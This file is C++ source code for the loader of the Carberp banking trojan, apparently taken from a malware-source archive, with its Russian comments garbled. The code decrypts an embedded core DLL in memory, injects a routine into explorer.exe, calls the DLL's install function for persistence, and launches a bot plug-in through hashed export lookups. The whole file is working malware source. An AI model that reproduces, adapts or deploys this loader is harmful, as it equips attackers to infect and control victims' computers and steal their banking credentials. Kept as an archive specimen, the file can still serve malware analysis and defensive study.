/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#pragma comment(linker, "/ENTRY:LoaderMain" )

#include "Source\MemoryDllLoader.h"
#include "Source\MemoryDLL.h"
#include "Source\LoaderUtils.h"

#include "CoreDllDef.h"
#include "GetApi.h"



char  DropperName[MAX_PATH];  // ��� ��� ����������� �����
DWORD DropperPID = 0; // PID ������� ����


//  ���������� DLL ����
namespace CoreDll
{
	#include "CoreDllData.cpp"	
}



//---------------------------------------------------------------------
//  ������� ��������� ������
//---------------------------------------------------------------------
void StartBotPlug(LPVOID Buf)
{
	LPVOID Handle = MemoryLoadLibrary(Buf,  false);
	if (Handle)
	{
		typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);
		#define HASH_START 0x3E987971 /* Start */
		TStart Start = (TStart)MemoryGetProcAddress(Handle, HASH_START);
		if (Start)
		{
			Start(NULL, NULL, NULL);
			OutputDebugStringA("-------------------------------------������ �������");
		}
	}
}




//---------------------------------------------------------------------
//  ������� �������� �������
//---------------------------------------------------------------------
DWORD WINAPI ExplorerMainProc(LPVOID)
{
	// ��������� dll 
	InitializeAPI();
	pOutputDebugStringA("1");
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);
OutputDebugStringA("2");
	// ���� ������. ����������� ���
	TInstall Install = (TInstall)MemoryGetProcAddress(Handle, COREDLL_INSTALL);
	OutputDebugStringA("3");
	if (Install)
	{
		OutputDebugStringA("4");
		Install(DropperName, FALSE, TRUE, DropperPID); 
	}
	OutputDebugStringA("5");
	// ��������� ������
	TLoadBotPlug LoadBP = (TLoadBotPlug)MemoryGetProcAddress(Handle, COREDLL_LOADBOTPLUG);
	TFreeBotPlug FreeBP = (TFreeBotPlug)MemoryGetProcAddress(Handle, COREDLL_FREEBOTPLUG);

	LPVOID PlugBuf;
	DWORD  Size;
	if (LoadBP  && LoadBP(&PlugBuf, &Size))
	{
		OutputDebugStringA("6");
		StartBotPlug(PlugBuf);
		OutputDebugStringA("7");

		if (FreeBP) FreeBP(PlugBuf);
	}


 OutputDebugStringA("8");
	// ��������� ��� ����
	MemoryFreeLibrary(Handle);

	OutputDebugStringA("9");

	return 0;
}




//---------------------------------------------------------------------
//  �������� ������� txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	// �������� ��� �������
	DropperPID = GetCurrentProcessId();
	GetModuleFileNameA(NULL, DropperName, MAX_PATH);


	// ��������� ���������� 
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);

	LPVOID Proc = MemoryGetProcAddress(Handle, COREDLL_INJECTINTOEXPLORER);
	// ��������� � explorer.exe
	if (Proc)
	{
		(TInjectIntoExplorer(Proc))(ExplorerMainProc);
	}
	
	MemoryFreeLibrary(Handle);


	ExitProcess(0);
	return 0;
}



